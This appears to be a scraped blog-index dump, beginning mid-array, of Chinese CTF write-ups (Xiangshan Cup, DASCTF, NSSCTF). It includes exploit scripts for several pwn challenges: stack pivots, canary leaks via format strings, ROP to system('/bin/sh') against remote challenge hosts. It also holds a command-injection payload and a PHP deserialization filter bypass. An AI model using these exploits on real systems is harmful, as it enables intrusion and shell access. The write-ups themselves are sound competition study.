13, 11, 15, 13, 11, 4, 14, 7, 14, 14, 10, 15, 15, 13, 16, 16, 11, 10, 20, 15, 8, 12, 17, 14, 8, 14, 17, 14, 21, 16, 15, 23, 13, 18, 14, 20, 11, 13, 20, 20, 16, 19, 16, 11, 16, 23, 21, 18, 16, 21, 18, 17, 19, 15, 13, 20, 13, 22, 23, 18, 17, 18, 21, 19, 22, 22, 17, 21, 16, 18, 15], [4197799, 4197792, 4197790, 4197798, 4197797, 4197801, 4197794, 4197796, 4197803, 4197801, 4197796, 4197795, 4197803, 4197795, 4197800, 4197793, 4197799, 4197799, 4197798, 4197793, 4197795, 4197796, 4197799, 4197804, 4197804, 4197797, 4197804, 4197794, 4197796, 4197798, 4197802, 4197798, 4197794, 4197799, 4197795, 4197803, 4197798, 4197802, 4197800, 4197804, 4197805, 4197798, 4197801, 4197804, 4197801, 4197805, 4197804, 4197799, 4197802, 4197799, 4197810, 4197804, 4197801, 4197807, 4197808, 4197806, 4197808, 4197806, 4197803, 4197804, 4197806, 4197801, 4197809, 4197803, 4197807, 4197804, 4197807, 4197803, 4197808, 4197806, 4197806, 4197815, 4197807, 4197816, 4197807, 4197813, 4197805, 4197801, 4197805, 4197806, 4197814, 4197810, 4197807, 4197811, 4197811, 4197809, 4197810, 4197809, 4197813, 4197810, 4197810, 4197815, 4197812, 4197808, 4197804, 4197808, 4197804, 4197811, 4197813, 4197815, 4197808, 4197808, 4197815, 4197815, 4197814, 4197819, 4197812, 4197816, 4197818, 4197815, 4197816, 4197817, 4197809, 4197811, 4197806, 4197817, 0, 3, 4197810, 4197816, 4197812, 4197819, 4197817, 4197811, 4197819, 4197815, 4197818, 4197814, 4, 4197816, 4197818, 4197818, 2, 4197820, 2, 4197816, 4197820, 1, 3, 2, 2, 3, 8, 1, 0, 4197816, 8, 9, 4, 4, 9, 6, 3, 6, 4, 12, 5, 3, 3, 7, 10, 9, 6, 6, 12, 13, 9, 12, 5, 7, 11, 13, 14, 12, 20, 8, 14, 11, 9, 13, 13, 12, 10, 14, 25, 13, 15, 14, 15, 12, 17, 22, 13, 14, 8, 20, 18, 16, 14, 18, 20, 19, 12, 18, 14, 20, 12, 21, 17, 27, 18, 13, 13, 16, 18, 19, 20, 19, 21, 20, 17, 21, 23, 19, 22, 21, 18, 18, 21, 28, 15, 19, 21, 25, 23, 21, 26, 20, 25, 22, 31, 30, 30, 24, 21, 21, 24, 24, 18, 22, 27, 23, 24, 24, 30, 26]]ct = a7076cebf86512a42b5258d5b197b2065123618122662c2c1533f698da00f21b4c0dbe5afd4cfd093339521ff61f7c4e 分析程序，可以发现在4A&#x3D;A的条件下，yv是由15个相同的ye生成的。 源程序为： te&#x3D;Av*sv we&#x3D;Av*yv zv&#x3D;ce*sv+yv 注意到yv&#x3D;[ye]*15 所以we&#x3D;sum(Av)*ye 所以ye可解，yv可解，sv&#x3D;(zv-yv)&#x2F;ce 签到&#x2F;问卷在对应位置获取即可（） Pwnn1canary硬干十小时的题目，最后也没有做出来，有点小不甘….（还是对漏洞不是很敏感，对C++ pwn的题型也接触的太少了） 写一下思路历程吧： 一开始把注意力放在了canary的泄露和绕过上，搞半天发现又是随机又是加密根本绕不过，只有一次可能的输出根本泄露不了一点 之后研究了下C++异常捕获基址，可以直接不判断canary，回退执行，但是出题人在捕获之后加了个exit（裂开），并没有什么用 再之后想通过Unwind_RaiseException唯一的leave_ret完成栈迁移然后发现输入点在gadget的下方（double裂开） 赛后复现了一下，调试的过程（下了六个断点）和静态分析基本上没有问题，思路在某些方面还是对的（通过C++捕获异常绕过两个canary，在bss段上布置backdoor）。问题出在没有注意析构函数_QWORD *__fastcall std::unique_ptr&lt;BOFApp&gt;::~unique_ptr(__int64 a1) 内部一个函数std::default_delete&lt;BOFApp&gt;::operator()(deleter, *v2)有一个对寄存器储存的地址经过两次解引用的调用： 可以看到，程序将rax的值作为地址解析并将rax的值指向的空间的数据储存到rdx，给rdx加上8后又将rdx指向的内存储存的数据传给rdx，最后执行rdx指向的内容 于是，自然产生了这样的想法：要是能够控制rax的值，不就可以执行任意地址指向的内容了吗 同样，可以执行我们程序给出的后门函数 调试可以发现，scanf有溢出，同时栈上读入点离上述rax地址相差0x70 溢出前 溢出后 这样在捕获异常后，继续执行析构函数就可以对rax解析一次后得到user_canary的地址0x4f4aa0，接下来还要继续对0x4f4aa0上储存的数据进行一次解析并调用，所以我们就可以通过第一次输入在user_canary写入backdoor地址，来构造rop 至此，思路就明了了，分为两步：1、第一次输入写入backdoor地址构造rop，2、第二次输入溢出覆盖rax为user_canary地址 注意几个坑： 测试的时候输入的数据不能太大，不然会卡在uw_frame_state_for函数根本没法执行到析构函数，分析不了一点 注意sl还是sd，单个自己解的影响在这题比较大（scanf在\\n处截断） 第二步溢出的时候记得不要改变地址0x403407，不然也会卡住（和1类似） 123456789101112131415161718192021from Excalibur import *contextset()proc(&#x27;./pwn&#x27;)debug(&#x27;b *0x0000000000403547\\n b *0x0000000000403633\\n b *0x00000000004037D5\\nb *0x0000000000403245\\nb *0x000000000040343C\\nb *0x42099a\\nb *0x040354C\\nb *0x00000000004038E6\\nb *0x403407\\n b *0x41fe58&#x27;)#debug(&#x27;b cxa_begin_catch&#x27;)system = 0x000000000040338Bcanary = 0x4f4aa0pay = (p64(canary)+p64(system)).ljust(0x40,b&#x27;a&#x27;)#40sda(b&#x27;\\n&#x27;,pay)pr(pay)#sla(b&#x27;pwn :)&#x27;,p64(0x4f4aa0))##sla(b&#x27;pwn :)&#x27;,b&#x27;a&#x27;*0x60)#sla(b&#x27;pwn :)&#x27;,b&#x27;a&#x27;*0x68+p64(0x403407)+p64(canary))#pr(rc())ia() 总结：还是得gdb和IDA结合者看啊，缺少任何一个都不行；C++析构函数很容易出现漏洞·","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.com/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"HASHTEAM香山杯WP","slug":"HASHTEAM香山杯WP","date":"2023-10-27T13:00:57.000Z","updated":"2024-01-31T02:03:21.880Z","comments":true,"path":"posts/2611e12a/","link":"","permalink":"http://lmarch2.github.com/posts/2611e12a/","excerpt":"本wp是队友们共同努力的结果，感谢.N1nEmAn、HeyGap、1cfh、shui、hash_hash等师傅。 HASHTEAM香山杯WPmisc签到题将题目所给编码丢入赛博大厨，得到类似凯撒密码的字符串。 因为flag格式第一个是f，则可以确定凯撒的偏移，得到flag。","text":"本wp是队友们共同努力的结果，感谢.N1nEmAn、HeyGap、1cfh、shui、hash_hash等师傅。 HASHTEAM香山杯WPmisc签到题将题目所给编码丢入赛博大厨，得到类似凯撒密码的字符串。 因为flag格式第一个是f，则可以确定凯撒的偏移，得到flag。 webPHP_unserialize_pro查看源码，很显然就是一个反序列化利用。 但是过滤了f l a g * ?，需要绕过。这里首先使用dir -1 /查看flag位置，发现是在第五个。然后使用rev /$(dir -l / | sed -n 5p)读取flag。得到一个反向flag。 再次反向得到flag。 12~/ctf/match/xsb2023/web » rev flag N1nE@N1nEmAnflag&#123;8bab51a8-191e-4e78-8ca4-f1fc3fb6c018&#125; ReURL从哪儿来运行题目所给的附件，设置断点在”ou.exe”所在处。在相应文件夹找到ou.exe的相关文件，然后拖入ida。 运行ou.exe文件，发现在v18 +&#x3D; strlen(v18)处下断点，搜索flag可以得到flag。 hello python了解到是python写的apk，定位所有与组件无关的后发现app.imy文件(用zip可以打开)，打开是个xxtea，直接解密即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = 0 z = v[n - 1] for i in range(rounds): x = (x + delta) &amp; 0xFFFFFFFF e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[n - 1] return vdef decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vc = [689085350 ,626885696 ,1894439255 ,1204672445 ,1869189675 ,475967424 ,1932042439 ,1280104741 ,2808893494 ]k = [12345678 ,12398712 ,91283904 ,12378192 ]m = (decrypt(c, k))for i in m: print(bytes.fromhex(hex(i)[2:]).decode()[::-1], end=&#x27;&#x27;)-------------------------------------------------------------------- pwnMove一道简单的栈迁移。第一次迁移到所给的skdd之后，泄露puts函数地址，接着返回到main，由于栈已经被迁移，返回地址被篡改，此时直接输入one_shot，即可返回到one_shot的地址上，从而getshell。具体的在注释。 12345678910111213141516171819202122232425262728293031323334353637383940414243from evilblade import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)setup(&#x27;./pwn2&#x27;)#libset(&#x27;libc-2.31.so&#x27;)rsetup(&#x27;101.201.35.76&#x27;,29720)evgdb()rdi = 0x401353lv = 0x000000000040124bpay = p64(rdi) + p64(gotadd(&#x27;puts&#x27;)) + p64(pltadd(&#x27;puts&#x27;))+ p64(0x401264)#泄露puts之后，返回到mainsd(pay)sa(&#x27;ber&#x27;,p32(0x12345678))#符合判断，执行溢出sd(b&#x27;a&#x27;*0x30+p64(0x405098)+p64(lv))#溢出进行栈迁移到skddaddx = getx64(-7,-1)base = addx - 0x80970sys = base + 0x4f420binsh = base + 0x1b3d88os = base + 0x4f302#输入oneshot，getshellsl(p64(os))#sd(p32(0x12345678))#sd(b&#x27;a&#x27;*0x30+p64(0x405098)+p64(lv))ia()&#x27;&#x27;&#x27;============================================================0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401350 : pop r14 ; pop r15 ; ret0x0000000000401352 : pop r15 ; ret0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret0x000000000040119d : pop rbp ; ret0x0000000000401353 : pop rdi ; ret0x0000000000401351 : pop rsi ; pop r15 ; ret0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040101a : ret&#x27;&#x27;&#x27; pwthon这道题目看起来很麻烦，实际上发现app.cpython-37m-x86_64-linux-gnu.so 就是cpython，就是python文件编译的有cpython库和libc库的一道题。 手动测试，发现每次输入会返回一个一模一样 的东西，猜测有格式化字符串漏洞。结果发现真有，由此泄露canary。 观察到so文件中有Give you ……字符串，此处即是刚才运行的函数，发现有栈溢出漏洞。 有了栈溢出和canary，那么直接打ret2libc即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445from evilblade import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)setup(&#x27;pwn&#x27;)rsetup(&#x27;39.106.48.123&#x27;, 13099)evgdb()sla(&#x27;&gt;&#x27;, b&#x27;0&#x27;)addx = getx(-15,-1)base = addx - 0x68b0dpx(&#x27;base&#x27;, base)sl(b&#x27;aaaaaaaa&#x27;+b&#x27;%p-&#x27;*38)can = getx(-20,-2)dpx(&#x27;canary&#x27;,can)rdi = base + 0x0000000000003f8fflag = base + 0x013B66rsi = base + 0x0000000000003cd9puts = base + 0x3710read = base + 0x3940op = base + 0x3ae0bss = base + 0x16a80write = base + 0x3760ret = base +0x000000000000301a#pay=(b&#x27;aaaaaaaa&#x27;*0x20+p64(can)*3+p64(rdi)+p64(binsh)+p64(puts))pay=(b&#x27;aaaaaaaa&#x27;*0x20+p64(can)*3+p64(rdi)+p64(base+0x016078)+p64(puts)+p64(base + 0x99f0))sl(pay)libc = tet()libc = getx64(0,-1) - 0x80970dpx(&#x27;libcbase&#x27;, libc)sl(b&#x27;a&#x27;)pay=(b&#x27;aaaaaaaa&#x27;*0x20+p64(can)*3+p64(rdi)+p64(libc + 0x1b3d88)+p64(ret)+p64(libc + 0x4f420)+p64(0xdeadbaef))sl(pay)ia() 参考文章补充一下，实在不知道怎么调试。打灰盒好累hhh。 https://www.cnblogs.com/ve1kcon/p/17766267.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475Pwthonpython pwn？实际上也是去跑 c 程序，不过还是第一次见。封装了一个 so 库，在 python 代码中会去调用这个库的函数，这样的话，相比起常规 pwn 题，就是会不好去调试。将库文件丢进 ida 分析，表面很复杂，有种做 vm 题的感觉（bushi实际上在第一个输入点输入0就能进入到 __pyx_f_3app_Welcome2Pwnthon 函数了，存在格式化字符串漏洞和栈溢出，而且直接给了 _pyx_f_3app_get_info 函数的地址，就能去计算这个库程序的基地址了，先泄 canary，后面就是 ret2libc 来 getshell 了image比较特别的点就是 __printf_chk 函数相较于普通的 printf 函数，不能使用 %N$ 的形式泄数据，然后格式化字符串的偏移是5（刚开始发现在上图中第一个 read 处直接敲个回车或者发送刚好 0x100 字节的数据过去之后都能泄点栈数据出来，比赛做这道题时琢磨了挺久这些数据能怎么用，因为当时没配通本地运行环境，也不知道泄出的是什么数据，然后后面倒是没用上这些数据赛后折腾了下运行环境，要和他生成 .so 用的 python3.7 版本一样才能运行，这样添加一下 syspath 就能直接 import app 了，在脚本中连gdb调试的话是这样写gdb.debug([&#x27;python&#x27;,&#x27;main.py&#x27;])断点断在 PyImport_ImportModule+4，然后一直往下运行看看那个包导入了 .soexp 如下from pwn import *from LibcSearcher import*p = remote(&#x27;101.201.35.76&#x27;, 20611)context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)p.sendline(&#x27;0&#x27;)p.recvuntil(&#x27;0x&#x27;)s = p.recv(12)get_info_addr = int(s,16)log.info(&quot;get_info_addr: &quot; + hex(get_info_addr))libc_base = get_info_addr - 0x68B0log.info(&#x27;libc_base: &#x27; + hex(libc_base))# 5+(0x118-0x10)/0x8payload = &#x27;%p&#x27;*37 + &#x27;flag&#x27; + &#x27;%p&#x27;p.sendline(payload)p.recvuntil(&#x27;flag&#x27;)p.recvuntil(&#x27;0x&#x27;)leak_canary = p.recv(16)leak_canary = int(leak_canary,16)log.info(&#x27;leak_canary: &#x27; + hex(leak_canary))pop_rdi_ret = libc_base + 0x3f8fpop_rsi_ret = libc_base + 0x3cd9main = libc_base + 0x99F0puts_plt = libc_base + 0x3710puts_got = libc_base + 0x16078payload = &#x27;a&#x27;*0x108 + p64(leak_canary) + &#x27;a&#x27;*8payload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base2 = puts_addr - libc.dump(&#x27;puts&#x27;)log.info(&#x27;libc_base2: &#x27; + hex(libc_base2))binsh = libc_base2 + libc.dump(&#x27;str_bin_sh&#x27;)system = libc_base2 + libc.dump(&#x27;system&#x27;)p.sendline(&#x27;a&#x27;)ret = libc_base + 0x9A93payload = &#x27;a&#x27;*0x108 + p64(leak_canary) + &#x27;a&#x27;*8payload += p64(ret)payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system)p.sendline(payload)p.interactive() cryptostrange_hash注意到没验证num tuple长度，直接求逆问题然后在得到的三元组后加一位0就行。 12345678910111213141516171819202122232425262728293031p = 18446744073709551557M = [[8, 56, 280], [18446744073709551543, 18446744073709551467, 18446744073709551123], [7, 35, 155]]ConInv = [0x39a3f978106bac2d,0x2940e055f4a33725,0xfda9a7a293fb5bc9]Con = [[0x9c52c2de7a9373c4,0xf2135cb886d0fa21,0x957df7f3cd4879e9], [0xd54f837d2738d717,0x400ddf1ffaae436d,0xc2abb601d9a26b07], [0x1904359f1deb3495,0xc21aa09ba52b157b,0x3d45525db1b19a0c], [0xed66cf26a65afc73,0x1cee569b29ffa476,0x3da45abf4304849], [0x1c1a642fa0f3d96d,0x59a1c4fbb96aec86,0xa18e9ca93163f63d], [0x9621ec9fbcb402be,0xd69468353c31bee0,0x50655b3f20fee3b8], [0x109cde7a61c2c195,0x5ebbd9e98be60c59,0x334d2d15f6e43190], [0x47af2b0d63901977,0x67ace097bf8c6f34,0xb87da3296b70d64b], [0x52d6344b38f49899,0xad5773add31420e1,0xecd0b7480f8c8095], [0xe2afb6d20f5decda,0xb1767d8be7d1371,0x902fd6806a0ef4db]]M = matrix(GF(p), M)u = vector(Zmod(p), [1, 1, 0])phi = M.multiplicative_order()d = inverse_mod(3, phi)def mypow(c, a): res = [] for i in c: res.append(pow(i, a, p)) return vector(GF(p), res)c3 = vector(GF(p), Con[3])c2 = vector(GF(p), Con[2])c1 = vector(GF(p), Con[1])c0 = vector(GF(p), Con[0])ni = M^(-1)u = mypow((u-c3)*ni, 3)u = mypow((u-c2)*ni, d)u = mypow((u-c1)*ni, 3)u = mypow((u-c0)*ni, d)-vector(GF(p), ConInv)print(u)&#x27;&#x27;&#x27;(5329202944861711021, 10075872277090249537, 6598944197421011167,0 )&#x27;&#x27;&#x27; liftged-251&#x3D;0 mod p^4，coppersmith取beta&#x3D;4&#x2F;6，epsilon&#x3D;0.03求解d mod p^4，利用ed-1和n做gcd分解n，最后有限域开根做lift即可 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import *from gmpy2 import irootn = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = e*x-251f = f.monic()d = f.small_roots(X=2^256, beta=0.63, epsilon=0.03)[0]p = iroot(GCD(e*d-251, n), 4)[0]q = n//p^5assert n == p^5*qphi = (p-1)*p^4*(q-1)d = inverse_mod(e//251, phi)cm = ZZ(pow(c, d, n))F1 = Zmod(p^3)F2 = Zmod(q)root1 = F1(cm).nth_root(251, all=True)root2 = F2(cm).nth_root(251, all=True)for i in root1: for j in root2: m = ZZ(crt([ZZ(i), ZZ(j)], [p^3, q])) if m.nbits() &lt;= 512: m = long_to_bytes(m) print(m)","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.com/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"DASCTF X CBCTF 2023 WP","slug":"DASCTF-X-CBCTF-2023-WP","date":"2023-10-27T12:56:45.000Z","updated":"2023-10-27T12:58:38.892Z","comments":true,"path":"posts/ec1aa757/","link":"","permalink":"http://lmarch2.github.com/posts/ec1aa757/","excerpt":"DASCTF X CBCTF 2023 WP PWNEASYBOX这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅 最后发现直接就是个web题，在PING函数里面执行system函数命令","text":"DASCTF X CBCTF 2023 WP PWNEASYBOX这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅 最后发现直接就是个web题，在PING函数里面执行system函数命令 ;tac fla’’g; GuestBook输入name的时候有溢出，可以覆盖一个字节泄露canary， 接着在strcpy中有溢出，直接传payload，被strcpy遇b’\\x00’截断这个问题卡住了（遇零截断意味着无法传输字符\\x00，然而canary以\\x00结尾） 调试解决发现在 __isoc99_scanf(“%s”, message);输入字符串的时候会在后面补零 于是可以通过多次输入先输入覆盖返回地址和canary除去\\x00的七个字符，再给canary补上\\x00 12345678910111213141516171819202122232425262728from Excalibur import*contextset()remo(&#x27;node4.buuoj.cn&#x27;,28227)#proc(&#x27;./GuestBook&#x27;)#debug(&#x27;b *0x000000000040143C&#x27;)sla(b&#x27;name:&#x27;,b&#x27;a&#x27;*(0x17)+b&#x27;b&#x27;)t1 = ru(b&#x27;\\n&#x27;)pr(t1)canary0 = ru(b&#x27;How&#x27;)[:-7]canary = (u64(b&#x27;\\x00&#x27;+canary0))prh(canary)system = 0x00000000004012C3sla(b&#x27;):&#x27;,b&#x27;4&#x27;)sl(cyclic(0x98)+b&#x27;a&#x27;+canary0+b&#x27;a&#x27;*8+p64(system))sl(b&#x27;a&#x27;)sl(b&#x27;a&#x27;)pr(type(canary))pay = cyclic(0x38)#+p64(canary)+b&#x27;a&#x27;*8+p64(system)sl(pay)ia() CryptoRSA想恢复p,关键在于二次剩余 加密是一个比特一个比特地加密,恢复时判断是否为二次剩余即可恢复 对于q就更简单,直接求多项式的gcd即可 代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from gmpy2 import *from Crypto.Util.number import *c = 124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369(e1, noise1, c1) = (1743, 44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776, 65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983)(e2, noise2, c2) = (1325, 35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683, 50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714)n2 = 103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393n1 = 65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309str0=&#x27;&#x27;#wp装不下这么长的字符#legendre_symbol(i,p)def GCD(a, b): if(b == 0): return a.monic() else: return GCD(b, a % b)F.&lt;x&gt;=PolynomialRing(Zmod(n2))f1=(x+noise1)^e1-c1f2=(x+noise2)^e2-c2#print(GCD(f1,f2))q=n2-103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936print(q)print(q.nbits())strlist=str0.split(&#x27;n&#x27;)#print(strlist)intlist=[int(i) for i in strlist[:-1]]#print(intlist)p=&#x27;&#x27;for i in intlist: #print(&#x27;test&#x27;+p) if jacobi(i,n1)==1: p=&#x27;1&#x27;+p #print(p) else: p=&#x27;0&#x27;+pprint(p)print(int(p,base=2))p=int(p,base=2) print(is_prime(p))print(ZZ(p).nbits())n=p*qphi=(p-1)*(q-1)d=inverse_mod(65537,phi)print(long_to_bytes(int(pow(c,d,n)))) CB backpack由于连续六个01串中有3个1，在原始背包格的基础上每连续六列新增一列，限制这个条件，最终LLL即可还原 脚本丢了XD","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.com/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"NSSCTF 2nd wp","slug":"NSSCTF 2nd wp","date":"2023-08-29T16:31:50.000Z","updated":"2024-01-31T02:11:40.259Z","comments":true,"path":"posts/4b18615c/","link":"","permalink":"http://lmarch2.github.com/posts/4b18615c/","excerpt":"NSSCTF 2nd WPMISCgift_in_qrcode1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import qrcodefrom PIL import Imagefrom random import randrange, getrandbits, seedimport osimport base64flag = os.getenv(&quot;FLAG&quot;)if flag == None: flag = &quot;flag&#123;test&#125;&quot;secret_seed = randrange(1, 1000)seed(secret_seed)reveal = []for i in range(20): reveal.append(str(getrandbits(8)))target = getrandbits(8)reveal = &quot;,&quot;.join(reveal)img_qrcode = qrcode.make(reveal)img_qrcode = img_qrcode.crop((35, 35, img_qrcode.size[0] - 35, img_qrcode.size[1] - 35))offset, delta, rate = 50, 3, 5img_qrcode = img_qrcode.resize( (int(img_qrcode.size[0] / rate), int(img_qrcode.size[1] / rate)), Image.LANCZOS)img_out = Image.new(&quot;RGB&quot;, img_qrcode.size)for y in range(img_qrcode.size[1]): for x in range(img_qrcode.size[0]): pixel_qrcode = img_qrcode.getpixel((x, y)) if pixel_qrcode == 255: img_out.putpixel( (x, y), ( randrange(offset, offset + delta), randrange(offset, offset + delta), randrange(offset, offset + delta), ), ) else: img_out.putpixel( (x, y), ( randrange(offset - delta, offset), randrange(offset - delta, offset), randrange(offset - delta, offset), ), )img_out.save(&quot;qrcode.png&quot;)with open(&quot;qrcode.png&quot;, &quot;rb&quot;) as f: data = f.read()print(&quot;This my gift:&quot;)print(base64.b64encode(data).decode(), &quot;\\n&quot;)print(target)ans = input(&quot;What&#x27;s your answer:&quot;)if ans == str(target): print(flag)else: print(&quot;No no no!&quot;)","text":"NSSCTF 2nd WPMISCgift_in_qrcode1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import qrcodefrom PIL import Imagefrom random import randrange, getrandbits, seedimport osimport base64flag = os.getenv(&quot;FLAG&quot;)if flag == None: flag = &quot;flag&#123;test&#125;&quot;secret_seed = randrange(1, 1000)seed(secret_seed)reveal = []for i in range(20): reveal.append(str(getrandbits(8)))target = getrandbits(8)reveal = &quot;,&quot;.join(reveal)img_qrcode = qrcode.make(reveal)img_qrcode = img_qrcode.crop((35, 35, img_qrcode.size[0] - 35, img_qrcode.size[1] - 35))offset, delta, rate = 50, 3, 5img_qrcode = img_qrcode.resize( (int(img_qrcode.size[0] / rate), int(img_qrcode.size[1] / rate)), Image.LANCZOS)img_out = Image.new(&quot;RGB&quot;, img_qrcode.size)for y in range(img_qrcode.size[1]): for x in range(img_qrcode.size[0]): pixel_qrcode = img_qrcode.getpixel((x, y)) if pixel_qrcode == 255: img_out.putpixel( (x, y), ( randrange(offset, offset + delta), randrange(offset, offset + delta), randrange(offset, offset + delta), ), ) else: img_out.putpixel( (x, y), ( randrange(offset - delta, offset), randrange(offset - delta, offset), randrange(offset - delta, offset), ), )img_out.save(&quot;qrcode.png&quot;)with open(&quot;qrcode.png&quot;, &quot;rb&quot;) as f: data = f.read()print(&quot;This my gift:&quot;)print(base64.b64encode(data).decode(), &quot;\\n&quot;)print(target)ans = input(&quot;What&#x27;s your answer:&quot;)if ans == str(target): print(flag)else: print(&quot;No no no!&quot;) 题目所给附件内容如上 分析过后发现直接输入打印出的target即可获得flag Magic Docker题目提示执行命令，docker run randark&#x2F;nssctf-round15-magic-docker 执行过后发现要求输入secrect 查看docker文件 发现app文件下的miain.py文件为 1234567891011121314151617181920212223242526272829303132333435363738394041424344import clickimport randomimport sysimport osfrom time import sleep@click.command()@click.option(&#x27;--secret&#x27;,help=&#x27;default=none,between 0 and 100&#x27;,type=int)def func(secret): if str(secret)==str(answer): print(&quot;Congratulations!&quot;) print(&quot;But where is your flag? (=‵ω′=)&quot;) else: print(&quot;No! You don&#x27;t know anything about docker!&quot;) print(&quot;How dare you! &quot;)BANNER=&quot;&quot;&quot;███╗ ██╗███████╗███████╗ ██████╗████████╗███████╗ ██████╗ ███╗ ██╗██████╗ ████╗ ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝ ╚════██╗████╗ ██║██╔══██╗ ██╔██╗ ██║███████╗███████╗██║ ██║ █████╗ █████╔╝██╔██╗ ██║██║ ██║ ██║╚██╗██║╚════██║╚════██║██║ ██║ ██╔══╝ ██╔═══╝ ██║╚██╗██║██║ ██║ ██║ ╚████║███████║███████║╚██████╗ ██║ ██║ ███████╗██║ ╚████║██████╔╝ ╚═╝ ╚═══╝╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═╝ ╚══════╝╚═╝ ╚═══╝╚═════╝ ███╗ ███╗ █████╗ ██████╗ ██╗ ██████╗ ██████╗ ██████╗ ██████╗██╗ ██╗███████╗██████╗ ████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝ ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔████╔██║███████║██║ ███╗██║██║ ██║ ██║██║ ██║██║ █████╔╝ █████╗ 